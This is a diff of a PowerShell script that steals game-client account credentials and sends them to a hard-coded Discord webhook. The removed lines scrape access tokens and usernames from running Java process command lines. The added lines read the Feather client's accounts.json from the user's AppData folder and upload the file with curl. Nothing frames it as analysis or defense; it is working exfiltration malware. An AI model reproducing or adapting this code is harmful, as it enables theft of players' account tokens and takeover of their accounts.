@@ -1,33 +1,37 @@
+# Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1357740527637758222/vEIwp5BR2jFWTvegjKyEBAo5x-9hP6DvIxurkGDbFRijQ_-ZYvTiphi_nNz1iW-c_bch"
 
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
-    Select-Object -ExpandProperty CommandLine |
-    ForEach-Object {
-        $accessToken = $null
-        $username = $null
+# Path to the accounts.json file
+$filePath = "$env:USERPROFILE\AppData\Roaming\.feather\accounts.json"
 
-        if ($_ -match '--accessToken\s+(\S+)') {
-            $accessToken = $matches[1]
-        }
-        if ($_ -match '--username\s+(\S+)') {
-            $username = $matches[1]
-        }
+# Check if the file exists
+if (-not (Test-Path $filePath)) {
+    Write-Host "File accounts.json does not exist at the specified path."
+    exit
+}
 
-        if ($accessToken -and $username) {
-           
-            $message = @"
-> **AccessToken:** $accessToken
-> **Username:** $username
+# Prepare message
+$message = "Here you go king :pray:"
+
+# Prepare payload JSON
+$payload = @{
+    content = $message
+} | ConvertTo-Json -Depth 3
+
+# Prepare the curl command to send the request
+$curlCommand = @"
+curl -X POST $webhookUrl ^
+     -H "Content-Type: multipart/form-data" ^
+     -F "payload_json=$($payload)" ^
+     -F "file=@$filePath"
 "@
 
-            Write-Output $message
+# Execute the curl command
+Invoke-Expression $curlCommand
 
-            
-            $payload = @{
-                content = $message
-            } | ConvertTo-Json -Depth 10
-
-            
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
-        }
-    } 
+# Check if the curl command succeeded
+if ($LASTEXITCODE -ne 0) {
+    Write-Host "Failed to send the webhook request."
+} else {
+    Write-Host "File sent successfully!"
+}
